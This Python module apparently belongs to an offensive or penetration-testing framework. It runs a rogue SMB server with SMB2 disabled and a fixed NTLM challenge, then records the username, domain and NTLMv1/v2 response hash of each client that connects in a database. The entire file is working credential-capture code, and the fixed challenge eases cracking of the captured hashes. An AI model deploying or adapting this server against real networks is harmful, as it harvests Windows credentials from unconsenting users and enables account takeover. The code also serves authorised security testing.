import os
from utils.db import DB
from utils.output import Output
from server.smbserver import *

def run_smb_server(ip, port):
    server = SimpleSMBServer(ip,int(port))

    server.addShare("Files", os.path.join(os.path.dirname(__file__), 'files'), "Files")
    server.setSMB2Support(False)

    server.setSMBChallenge('0123456789')

    #server.setLogFile('')

    server.start()

def ntlm_challenge(client_ip, ntlm_chall):
    Output.major("NTLM challenge from %s> %s" % (client_ip, ntlm_chall))
    parts = ntlm_chall.split(':')
    DB.insert_domain_user({
        'domain': parts[2],
        'username': parts[0],
        'hash': ntlm_chall,
    })

